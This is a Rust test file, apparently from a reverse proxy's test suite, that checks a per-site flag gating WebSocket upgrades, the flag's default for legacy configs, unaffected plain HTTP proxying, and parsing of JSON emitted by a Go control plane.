async fn websocket_upgrade_allowed_when_site_enables_it() {
    let (up_addr, _up) = start_ws_mock_upstream().await;
    let port = next_port();
    let (tx, jh) = start_proxy(ws_test_config(port, up_addr.port(), true)).await;

    let resp = send_ws_handshake(port, "test-site.local").await;

    assert!(
        resp.starts_with("HTTP/1.1 101"),
        "websocket:true must negotiate the upgrade, got: {:?}",
        resp.lines().next()
    );
    shutdown_proxy(tx, jh).await;
}

#[tokio::test]
async fn websocket_upgrade_refused_when_site_disables_it() {
    let (up_addr, _up) = start_ws_mock_upstream().await;
    let port = next_port();
    let (tx, jh) = start_proxy(ws_test_config(port, up_addr.port(), false)).await;

    let resp = send_ws_handshake(port, "test-site.local").await;

    // Not a 101, and specifically NOT a dangling upgrade: the client gets a real
    // HTTP response it can act on.
    assert!(
        !resp.contains("101 Switching Protocols"),
        "websocket:false must not upgrade, got: {:?}",
        resp.lines().next()
    );
    assert!(
        resp.starts_with("HTTP/1.1 200"),
        "expected the origin's plain HTTP answer, got: {:?}",
        resp.lines().next()
    );
    // The origin must not even have seen the handshake headers.
    assert!(
        resp.contains("ws_headers=false"),
        "Sec-WebSocket-* headers leaked to the origin: {resp:?}"
    );
    shutdown_proxy(tx, jh).await;
}

#[tokio::test]
async fn websocket_disabled_is_the_default_for_legacy_config() {
    // A config that never mentions WebSockets must deserialize to false. The old
    // relay upgraded on any origin 101, so defaulting to true here would silently
    // re-open that on every pre-existing site.
    let json = r#"{
        "load_balancer": "round_robin",
        "servers": [{"host": "127.0.0.1", "port": 8080, "weight": 1, "tls": false}]
    }"#;
    let parsed: UpstreamConfig = serde_json::from_str(json).expect("legacy upstream must parse");
    assert!(
        !parsed.websocket,
        "absent `websocket` must default to false, not allow upgrades"
    );
}

#[tokio::test]
async fn non_websocket_traffic_unaffected_by_the_gate() {
    // Regression: ordinary proxying must be untouched with the gate closed.
    let (up_addr, _up) = start_ws_mock_upstream().await;
    let port = next_port();
    let (tx, jh) = start_proxy(ws_test_config(port, up_addr.port(), false)).await;

    let (status, body) = send_request(port, "test-site.local", "/", Method::GET, "").await;

    assert_eq!(status, StatusCode::OK, "plain GET must still be proxied");
    let body = String::from_utf8_lossy(&body);
    assert!(
        body.contains("plain-http"),
        "expected the origin's response, got: {body:?}"
    );
    shutdown_proxy(tx, jh).await;
}

/// Cross-language contract check. This is the EXACT JSON that
/// `buildRustUpstream` in the Go control plane emits for the live "Juice Shop"
/// site, captured from its real stored config. The two sides are compiled and
/// tested separately, so nothing else stops the producer and the consumer of
/// this payload from drifting apart — which is precisely how `upstream.proxy`
/// came to be sent for months and never read.
#[tokio::test]
async fn generated_control_plane_config_parses_and_gates_correctly() {
    let from_go = r#"{"load_balancer":"round_robin","servers":[{"host":"juiceshop","port":3000,"tls":false,"weight":1}],"timeout_secs":60,"websocket":false}"#;

    let parsed: UpstreamConfig = serde_json::from_str(from_go)
        .expect("the control plane's generated upstream config must deserialize");

    assert!(
        !parsed.websocket,
        "proxy.websocket=false must arrive as websocket=false and gate the relay"
    );
    // The timeout path must be untouched by the WebSocket work.
    assert_eq!(parsed.timeout_secs, Some(60), "timeout_secs must survive");
    assert_eq!(parsed.servers.len(), 1);
    assert_eq!(parsed.servers[0].host, "juiceshop");

    // And the enabled form, same shape.
    let enabled = from_go.replace("\"websocket\":false", "\"websocket\":true");
    let parsed: UpstreamConfig = serde_json::from_str(&enabled).unwrap();
    assert!(parsed.websocket, "websocket=true must enable the relay");
}
